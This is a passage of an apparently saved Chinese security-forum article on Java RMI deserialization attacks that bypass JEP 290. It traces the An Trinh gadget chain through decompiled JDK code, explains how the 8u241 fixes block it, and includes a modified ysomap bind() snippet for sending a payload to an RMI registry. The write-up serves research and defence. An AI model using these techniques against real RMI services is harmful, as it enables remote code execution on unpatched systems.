+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Remote</span> <span class="n">var1</span><span class="o">,</span> <span class="n">Method</span> <span class="n">var2</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">var3</span><span class="o">,</span> <span class="kt">long</span> <span class="n">var4</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="c1">//省略部分代码...  </span>
+        <span class="c1">//从ref中获取连接</span>
+        <span class="n">Connection</span> <span class="n">var6</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">ref</span><span class="o">.</span><span class="na">getChannel</span><span class="o">().</span><span class="na">newConnection</span><span class="o">();</span>
+        <span class="n">StreamRemoteCall</span> <span class="n">var7</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="kt">boolean</span> <span class="n">var8</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+        <span class="kt">boolean</span> <span class="n">var9</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+        <span class="n">Object</span> <span class="n">var13</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">clientRefLog</span><span class="o">.</span><span class="na">isLoggable</span><span class="o">(</span><span class="n">Log</span><span class="o">.</span><span class="na">VERBOSE</span><span class="o">))</span> <span class="o">{</span>
+                <span class="n">clientRefLog</span><span class="o">.</span><span class="na">log</span><span class="o">(</span><span class="n">Log</span><span class="o">.</span><span class="na">VERBOSE</span><span class="o">,</span> <span class="s">"opnum = "</span> <span class="o">+</span> <span class="n">var4</span><span class="o">);</span>
+            <span class="o">}</span>
+           <span class="c1">//********对ref发起JRMP请求**********</span>
+            <span class="n">var7</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StreamRemoteCall</span><span class="o">(</span><span class="n">var6</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">ref</span><span class="o">.</span><span class="na">getObjID</span><span class="o">(),</span> <span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">var4</span><span class="o">);</span>
+           <span class="c1">//处理结果</span>
+            <span class="n">Object</span> <span class="n">var11</span><span class="o">;</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">ObjectOutput</span> <span class="n">var10</span> <span class="o">=</span> <span class="n">var7</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span>
+                <span class="k">this</span><span class="o">.</span><span class="na">marshalCustomCallData</span><span class="o">(</span><span class="n">var10</span><span class="o">);</span>
+                <span class="n">var11</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getParameterTypes</span><span class="o">();</span>
+
+                <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">var12</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">var12</span> <span class="o">&lt;</span> <span class="o">((</span><span class="n">Object</span><span class="o">[])</span><span class="n">var11</span><span class="o">).</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">var12</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="n">marshalValue</span><span class="o">((</span><span class="n">Class</span><span class="o">)((</span><span class="n">Object</span><span class="o">[])</span><span class="n">var11</span><span class="o">)[</span><span class="n">var12</span><span class="o">],</span> <span class="n">var3</span><span class="o">[</span><span class="n">var12</span><span class="o">],</span> <span class="n">var10</span><span class="o">);</span>
+                <span class="o">}</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var39</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">clientRefLog</span><span class="o">.</span><span class="na">log</span><span class="o">(</span><span class="n">Log</span><span class="o">.</span><span class="na">BRIEF</span><span class="o">,</span> <span class="s">"IOException marshalling arguments: "</span><span class="o">,</span> <span class="n">var39</span><span class="o">);</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">MarshalException</span><span class="o">(</span><span class="s">"error marshalling arguments"</span><span class="o">,</span> <span class="n">var39</span><span class="o">);</span>
+            <span class="o">}</span>
+           <span class="c1">//*******JRMP服务端返回信息，反序列化触发处*******</span>
+            <span class="n">var7</span><span class="o">.</span><span class="na">executeCall</span><span class="o">();</span>
+</pre></div>
+<p>JRMP请求已经发起了并且返回包也收到了，接下来的报错信息饭反序列化触发点就一样了</p>
+<p><code>sun.rmi.transport.StreamRemoteCall#executeCall</code></p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">executeCall</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+<span class="c1">//..省略</span>
+  <span class="k">switch</span><span class="o">(</span><span class="n">var1</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+            <span class="k">return</span><span class="o">;</span>
+        <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+            <span class="n">Object</span> <span class="n">var14</span><span class="o">;</span>
+            <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">//***这里触发反序列化JRMP服务端的返回的恶意对象***</span>
+                <span class="n">var14</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">in</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var10</span><span class="o">)</span> <span class="o">{</span>
+</pre></div>
+<p>总结三个关键点：</p>
+<ol>
+<li>利用readobject的复写特性执行UnicastRemoteObject的readObject</li>
+<li>利用动态代理的拦截执行invoke的特性，在UnicastRemoteObject#readObject的调用链中执行<code>proxy对象.createServerSocket</code>跳到了RemoteObjectInvocationHandler的invoke方法</li>
+<li>RemoteObjectInvocationHandler的invoke方法可以根据内置的ref向外发起JRMP连接，再反序列化返回结果</li>
+</ol>
+<p>妙呀妙呀，动态代理终于再也不是工具人了。</p>
+<p>妙啊妙啊，大佬就是大佬。</p>
+<h3 id="toc-7">复现—绕过8u231</h3>
+<p>利用ysomap的RMIConnectWithUnicastRemoteObject模块就可以惹。（也可以在源码的ysomap.core.exploit.rmi.NamingTest#lookup测试模块进行测试）</p>
+<p>但是我们会发现........刚才用之前的<strong>readobject的递归-填装-触发</strong>绕过方法在8u231还会被完美拦截，这次却可以了.....</p>
+<p><a id="img34" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152423-65b6d8f2-b459-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152423-65b6d8f2-b459-1.png"></a></p>
+<p>激动的搓手手！An Trinh NB！鸡肋个锤子鸡肋，这个绕过方式绕过了231u11版本！！！</p>
+<p>我们来看看是如何做到的！同样从231u11的两处修复出发：</p>
+<ol>
+<li><code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>报错情况消除ref<br>
+看上面的触发流程，你就知道为啥绕过了。<br>
+这项修复针对的是<strong>readobject的递归-填装-触发模式</strong>JRMP请求发起，在readobject中利用复写的Gadagets完全不受这个ref清除操作的影响。完美！</li>
+<li><code>sun.rmi.transport.DGCImpl_Stub#dirty</code>提前了黑名单<br>
+这是针对在JRMP触发链获取到JRMP服务器之后的一个黑名单拦截修复。<br>
+但是看看上面利用成功调用栈，会发现这个调用栈压根不走DGC层的dirty，而是直接调用了ref的invoke，相当于绕过了之前触发链的黑名单拦截。完美！</li>
+</ol>
+<p>那么为什么这个Gadgets能绕过231u11的修复，我们也就清楚了。也不知道是无意为之还是刻意所为，这种每个地方都恰到好处的美感.......嘶.......</p>
+<h3 id="toc-8">8u241的修复第一处</h3>
+<p>在8u241版本，针对这个绕过链进行了修复：修复说明在<a href="https://www.oracle.com/technetwork/java/javase/8u241-relnotes-5813177.html#JDK-8230967" target="_blank">Oracle官网也有说明</a></p>
+<p>重点就是把应该是String的地方从本来的<code>(String)var9.readobject()</code>改成了<br>
+<code>SharedSecrets.getJavaObjectInputStreamReadString().readString(var9);</code>前者是可以反序列化Object的，但是后者就完全不接受反序列化Object。</p>
+<p><a id="img35" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152447-7375d8c6-b459-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152447-7375d8c6-b459-1.png"></a></p>
+<p>为什么荃湾不接受反序列化Object呢，调试跟进看readString里面：</p>
+<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="n">String</span> <span class="nf">readString</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">readObject</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span><span class="c1">//进入此处</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">cnf</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalStateException</span><span class="o">(</span><span class="n">cnf</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>调用了<code>java.io.ObjectInputStream#readObject(java.lang.Class&lt;?&gt;)</code>，这个readString进来的接口跟我们平时调用readObject不一样：</p>
+<div class="highlight"><pre><span></span><span class="c1">//平时调用的</span>
+<span class="kd">public</span> <span class="kd">final</span> <span class="n">Object</span> <span class="nf">readObject</span><span class="o">()</span>
+    <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
+    <span class="k">return</span> <span class="n">readObject</span><span class="o">(</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span><span class="c1">//我们平常会进入此处</span>
+<span class="o">}</span>
+</pre></div>
+<p><code>readObject(Object.class);</code>与<code>readObject(String.class);</code></p>
+<p>在<code>java.io.ObjectInputStream#readObject(type)</code>会进行一些无关竟要的操作然后传递type<br>
+进入<code>java.io.ObjectInputStream#readObject0(type)</code>：</p>
+<div class="highlight"><pre><span></span><span class="c1">//8u241时这里，type传入String</span>
+<span class="kd">private</span> <span class="n">Object</span> <span class="nf">readObject0</span><span class="o">(</span><span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">type</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">unshared</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+    <span class="c1">//...</span>
+    <span class="k">case</span> <span class="n">TC_OBJECT</span><span class="o">:</span><span class="c1">//我们输入的payload对象是一个Object</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">type</span> <span class="o">==</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
+            <span class="c1">//8u241 type=String 直接在此处报错不进行反序列化了</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="n">ClassCastException</span><span class="o">(</span><span class="s">"Cannot cast an object to java.lang.String"</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="c1">//之前的版本都是传入type=Object于是正常反序列化</span>
+        <span class="k">return</span> <span class="n">checkResolve</span><span class="o">(</span><span class="n">readOrdinaryObject</span><span class="o">(</span><span class="n">unshared</span><span class="o">));</span>
+    <span class="c1">//..</span>
+<span class="o">}</span>
+</pre></div>
+<p>所以在8u241中，如果参数应该是String的反序列化点就直接拒绝了Object的反序列化，杜绝了我们的上面的Gadgets。</p>
+<h3 id="toc-9">bind加上IP限制枷锁还可以用？</h3>
+<p>那么是不是所有地方都做了这种限制呢？其实也不是，重新看回<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>:</p>
+<div class="highlight"><pre><span></span><span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
+     <span class="c1">//bind操作，权限检查</span>
+     <span class="n">RegistryImpl</span><span class="o">.</span><span class="na">checkAccess</span><span class="o">(</span><span class="s">"Registry.bind"</span><span class="o">);</span>
+
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="n">var10</span> <span class="o">=</span> <span class="o">(</span><span class="n">ObjectInputStream</span><span class="o">)</span><span class="n">var7</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+        <span class="n">var8</span> <span class="o">=</span> <span class="n">SharedSecrets</span><span class="o">.</span><span class="na">getJavaObjectInputStreamReadString</span><span class="o">().</span><span class="na">readString</span><span class="o">(</span><span class="n">var10</span><span class="o">);</span>
+        <span class="n">var81</span> <span class="o">=</span> <span class="o">(</span><span class="n">Remote</span><span class="o">)</span><span class="n">var10</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span><span class="c1">//这里还是正常的readObject</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="o">|</span> <span class="n">ClassNotFoundException</span> <span class="o">|</span> <span class="n">ClassCastException</span> <span class="n">var78</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">var7</span><span class="o">.</span><span class="na">discardPendingRefs</span><span class="o">();</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"error unmarshalling arguments"</span><span class="o">,</span> <span class="n">var78</span><span class="o">);</span>
+    <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+        <span class="n">var7</span><span class="o">.</span><span class="na">releaseInputStream</span><span class="o">();</span>
+    <span class="o">}</span>
+</pre></div>
+<p>发现bind中还是有可以反序列化的点的。但是这又回到了原来的问题：</p>
+<p>bind由于<code>RegistryImpl.checkAccess("Registry.bind");</code>这句话在8u141之后有注册端地址校验限制，我们之前也是想要绕过8u141的限制所以转战lookup。（同时rebind也一样）</p>
+<p>那么我们可不可以接受IP限制，假设场景：RMI服务器与RMI注册端分离，我们获取了一台对方内网的RMI服务器然后去利用RMI反序列化攻击RMI注册端，是否在8u241的版本下可行呢？</p>
+<ol>
+<li>使用bind通讯</li>
+<li>使用An Trinh的UnicastRemoteObject链</li>
+<li>由于使用到UnicastRemoteObject对象这就需要修改bind的底层协议使UnicastRemoteObject对象内容不会被覆盖，这就需要修改bind通讯。（在 绕过序列化过程中的替换使所有类均可用于攻击 一节中提到）</li>
+</ol>
+<p>选取ysomap作为poc构造工具，参考lookup重构一个bind协议：</p>
+<p><code>ysomap.core.exploit.rmi.component.Naming</code></p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="n">Remote</span> <span class="nf">bind</span><span class="o">(</span><span class="n">Registry</span> <span class="n">registry</span><span class="o">,</span><span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="n">Object</span> <span class="n">obj</span><span class="o">)</span>
+            <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="c1">//..一致</span>
+        <span class="n">java</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">RemoteCall</span> <span class="n">call</span> <span class="o">=</span> <span class="n">ref</span><span class="o">.</span><span class="na">newCall</span><span class="o">((</span><span class="n">java</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">RemoteObject</span><span class="o">)</span> <span class="n">registry</span><span class="o">,</span> <span class="n">operations</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">interfaceHash</span><span class="o">);</span><span class="c1">//修改为0，bind接口编号</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectOutput</span> <span class="n">out</span> <span class="o">=</span> <span class="n">call</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span>
+                <span class="c1">//反射修改enableReplace，处理覆盖问题</span>
+                <span class="n">ReflectionHelper</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">out</span><span class="o">,</span> <span class="s">"enableReplace"</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
+                <span class="n">out</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">name</span><span class="o">);</span><span class="c1">//随便写</span>
+                <span class="n">out</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span> <span class="c1">// payload</span>
+            <span class="c1">//..</span>
+    <span class="o">}</span>
+</pre></div>
+<p>然后修改<code>ysomap.core.exploit.rmi.RMIRegistryExploit</code>里面<code>Naming.lookup(registry, remote);</code>为<code>Naming.bind(registry, name,remote);</code></p>
+<p>尝试攻击8u241</p>
+<p>华丽失败</p>
+<h3 id="toc-10">8u241的修复第二处</h3>
+<p>好吧，肯定是哪里有问题，0day就这样没了（狗头）。</p>
+<p>问题在于8u241还修复了调用栈中的<code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</code>方法。（复用调用栈的图，第三行）</p>
+<p><a id="img36" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152511-8210b892-b459-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152511-8210b892-b459-1.png"></a></p>
+<p>对比下8u231和8u241：</p>
+<p><a id="img37" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152529-8ca0bd5c-b459-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152529-8ca0bd5c-b459-1.png"></a></p>
+<p>添加了一处针对传入method的验证。</p>
+<p><a id="img38" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152540-9366ce6a-b459-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622152540-9366ce6a-b459-1.png"></a></p>
+<p>这个的method是从<code>sun.rmi.transport.tcp.TCPEndpoint#newServerSocket</code>的</p>
+<div class="highlight"><pre><span></span><span class="n">ServerSocket</span> <span class="n">var2</span> <span class="o">=</span> <span class="o">((</span><span class="n">RMIServerSocketFactory</span><span class="o">)</span><span class="n">var1</span><span class="o">).</span><span class="na">createServerSocket</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">listenPort</span><span class="o">);</span>
+</pre></div>
+<p>由于动态代理特性过来的，method就是createServerSocket这个方法，然而它理所当然不是一个remote接口</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">interface</span> <span class="nc">RMIServerSocketFactory</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="n">ServerSocket</span> <span class="nf">createServerSocket</span><span class="o">(</span><span class="kt">int</span> <span class="n">port</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="n">IOException</span><span class="o">;</span>
+<span class="o">}</span>
+</pre></div>
+<p>所以即使我们用bind绕过第一个修复，还是被第二个修复处给干掉了。</p>
+<p>假如要硬趟着修复点过去，必须在UnicastRemoteObject的invoke的调用栈中，找到一个可控的同时方法还是remote的地方，再把它接到RemoteObjectInvocationHandler的invoke方法，从而满足这个修复点的验证。</p>
+<p>太难，太难。</p>
+<p>至此8u241之后针对RMI服务的反序列化攻击，就GG了......</p>
+<h2 id="toc-11">小结&amp;总结</h2>
+<p>针对利用JRMP反序列化绕过JEP290-bind：</p>
+<ol>
+<li>反序列化打服务端，可以使用一个服务端不存在的类。在这个服务端不存在的类的变量中放入payload，这个payload会在服务端反序列化这个不存在的类的时候触发，虽然会报错，但是会触发。</li>
+<li>指出了<a href="https://xz.aliyun.com/t/[http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/](http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/" target="_blank">bsmali4师傅的文</a>)中关于UnicastRemoteObject类不能用是因为ref属性为transient的错误。（在动态代理-RemoteObjectInvocationHandler一节中）</li>
+<li>在利用JRMP反序列化绕过JEP290的Ysoserial的实现中，利用RemoteObjectInvocationHandler仍然使用动态代理是非必要的。</li>
+<li>在利用JRMP反序列化绕过JEP290的Ysoserial的实现，利用服务端不存在的自定义的InvocationHandler是可行的。</li>
+</ol>
+<p>针对利用JRMP反序列化绕过JEP290-lookup：</p>
+<ol>
+<li>利用lookup，绕过了8u141的限制，从而真正完成了JEP290的版本绕过</li>
+</ol>
+<p>来自An Trinh的另一种绕过JEP290的思路：</p>
+<ol>
+<li>利用RemoteObjectInvocationHandler完全不同的触发点，绕过了8u231的修复，被8u241阻止了为所欲为。</li>
+</ol>
+<p>最后总结：</p>
+<p><a id="img39" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622150836-310004d2-b457-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622150836-310004d2-b457-1.png"></a></p>
+<h2 id="toc-12">参考</h2>
+<p>认真看了很多老哥的博客，先给全员点个赞：</p>
+<p>写到一半的时候发现总体文章框架是跟<a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank">attacking-java-rmi-services-after-jep-290</a>雷同的，原来我想写的已经有人做过了，想想当作这篇文章详细版本好了，但是到后面发现还是发现了一些别人没有记录下来或没有细说的东西，比如自定义类，lookup绕过等。</p>
+<p>在文章后半部分还大量参考了<a href="https://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/" target="_blank">0kami的研究结果</a>和<a href="https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/" target="_blank">An Trinh的绕过方式</a>，膜拜。</p>
+<p>此外<a href="https://paper.seebug.org/1091/" target="_blank">paper这篇</a>在第三点RMI的动态加载、第四点JNDI注入都花了比较多的笔墨，但是在对于第二点RMI服务端的反序列化攻击中，讨论了<strong>RMI客户端--攻击--&gt;RMI服务端</strong>的情况，同时也是要求RMI服务端必须提供一个输入参数为Object的方法，客户端调用这个方法传入Object的payload。此外将RMI<strong>客户端--通过lookup攻击--&gt;RMI注册端</strong>的情况点了一下（也就是我忽略了的注册端）。</p>
+<p><a href="https://xz.aliyun.com/t/7079" target="_blank">threedr3am第一篇</a>讲述了JNDI注入、<strong>RMI服务端---通过bind攻击--RMI注册端</strong>，导致RMI注册端被RCE（此处他文章中的标题与讲述内容不符，应该是标题写错了），JRMP的客户端与服务端攻击。</p>
+<p><a href="https://xz.aliyun.com/t/7264" target="_blank">threedr3am第二篇</a>细节分析了<strong>RMI客户端---通过lookup攻击--RMI注册端</strong>（以及注册端回打客户端）、<strong>RMI服务端---通过bind攻击--RMI注册端</strong>，点了一下<strong>RMI客户端---通过替换参数攻击--RMI服务端</strong>，重新分析了下JNDI注入关于Reference远程对象的细节（这里可能会出现误解，攻击场景是我们控制一个RMI服务端，我们要让RMI客户端（受害者）主动来<code>new InitialContext().lookup</code>我们，这个lookup与RMI客户端查询RMI注册端的lookup不一样【前者的lookup=后者的lookup查询+会触发漏洞的解析过程】，最后导致客户端被RCE）、打注册端时在8u121之后的JDK存在黑名单，出现Yso-RMIClient、再是JNDI注入绕过。</p>
+<p><a href="https://www.anquanke.com/post/id/200860" target="_blank">afanti的Bypass JEP290攻击rmi</a>与<a href="https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg" target="_blank">0c0c0f的RMI漏洞的另一种利用方式</a>实际都是讲述了客户端攻击服务端解析参数时绕过Object的方法</p>
+<p><a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank">https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a></p>
+<p>译文：<a href="https://nosec.org/home/detail/2541.html" target="_blank">https://nosec.org/home/detail/2541.html</a></p>
+<p><a href="https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/" target="_blank">https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/</a></p>
+<p><a href="https://paper.seebug.org/1091/" target="_blank">https://paper.seebug.org/1091/</a></p>
+<p><a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/" target="_blank">http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/</a></p>
+<p><a href="https://www.anquanke.com/post/id/204740" target="_blank">https://www.anquanke.com/post/id/204740</a></p>
+<p><a href="https://www.anquanke.com/post/id/197829" target="_blank">https://www.anquanke.com/post/id/197829</a></p>
+<p><a href="https://www.anquanke.com/post/id/199481" target="_blank">https://www.anquanke.com/post/id/199481</a></p>
+<p><a href="https://blog.csdn.net/leehdsniper/article/details/71599504" target="_blank">https://blog.csdn.net/leehdsniper/article/details/71599504</a></p>
+<p><a href="http://www.hayasec.me/2018/03/21/java-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E9%97%B2%E8%B0%88/" target="_blank">http://www.hayasec.me/2018/03/21/java-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E9%97%B2%E8%B0%88/</a></p>
+<p><a href="https://www.anquanke.com/post/id/85681" target="_blank">https://www.anquanke.com/post/id/85681</a></p>
+<p><a href="https://www.freebuf.com/articles/web/214096.html" target="_blank">https://www.freebuf.com/articles/web/214096.html</a></p>
+<p><a href="https://www.apiref.com/java11-zh/java.rmi/java/rmi/dgc/DGC.html" target="_blank">https://www.apiref.com/java11-zh/java.rmi/java/rmi/dgc/DGC.html</a></p>
+<p><a href="https://xz.aliyun.com/t/2651" target="_blank">https://xz.aliyun.com/t/2651</a></p>
+<p><a href="https://xz.aliyun.com/t/2650" target="_blank">https://xz.aliyun.com/t/2650</a></p>
+<p><a href="https://xz.aliyun.com/t/2649" target="_blank">https://xz.aliyun.com/t/2649</a></p>
+
+            </div>
+            
+
+            <div class="post-user-action" style="margin-top: 34px;">
+                <span class="btn btn-default pull-right" id="mark" data-action="topic" data-pk="7932">
+                    <span id="mark-text">点击收藏 </span><span class="i-seprator"> | </span><span id="mark-count">6</span>
+                </span>
+                
+                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="7932">
+                     <span>关注</span><span class="i-seprator"> | </span><span id="follow-count">2</span>
+                    </span>
+                
+                <div class="clearfix"></div>
+            </div>
+            
+                <div class="related-section">
+                    <div class="related-box">
+                        
+                            <span><a class="pull-left" href="https://xz.aliyun.com/t/7938" title="踩坑记录-DNS Beacon"><span class="related-label" style="padding: 3px 4px;margin-right: 3px;">上一篇：</span>踩坑记录-DNS Beacon</a></span>
+                        
+                        
+                            <span><a class="pull-left" href="https://xz.aliyun.com/t/7929" title="CVE-2020-4046：WordPress内核存储型XSS分析"><span class="related-label" style="">下一篇：</span>CVE-2020-4046：Wor...</a></span>
+                        
+                    </div>
+                </div>
+            
+        </div>
+    </div>
+</div>
+
+    <!-- topic & appendix -->
+    
+
+
+
+<div class="row box">
+    <ol class="breadcrumb">
+        <li class="active">0 条回复</li>
+    </ol>
+    <div class="box-container post-container">
+        
+            <ul>
+                <li style="min-height: 50px;line-height: 60px;margin-left: 15px"><strong>动动手指，沙发就是你的了！</strong></li>
+            </ul>
+        
+    </div>
+</div>
+
+
+    <!-- posts of topic -->
+    
+        <div class="row box" id="reply-box">
+            
+            <div class="box-container clearfix">
+                
+                    <div class="reminder">
+                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7932&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
+                    </div>
+                
+            </div>
+        </div>
+    
+    <!-- editor for post -->
+    
+
+        </div>
+        <div class="span3 pull-right offset sidebar">
+            
+
+
+    <div class="box">
+        <div class="info-panel">
+            <p><strong>先知社区</strong></p>
+            <hr>
+            <p class="text-center login-btn">
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7932&amp;from_type=xianzhi" class="btn">现在登录</a>
+            </p>
+        </div>
+    </div>
+
+
+
+    <div class="box">
+        <div class="hot-node notice">
+            <div class="info-body">
+                <a href="https://xz.aliyun.com/notice" style="padding: 4px 10px 4px 10px;">社区小黑板</a>
+            </div>
+        </div>
+    </div>
+
+
+<div class="box">
+    <div class="global-charts">
+        <div id="chart-header">
+            <div class="col-sm-4 text-center charts" data-type="year">
+                年度贡献榜
+            </div>
+            <div class="text-center charts active" data-type="month">
+                月度贡献榜
+            </div>
+            <div class="clearfix"></div>
+        </div>
+        <div id="chart_body">
+            <div class="info-body" data-type="year">
+
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/19809_81cdc44b3d98558e6a.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/19809" title="Stars">Stars</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">5</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/21686" title="Ainrm">Ainrm</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">4</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
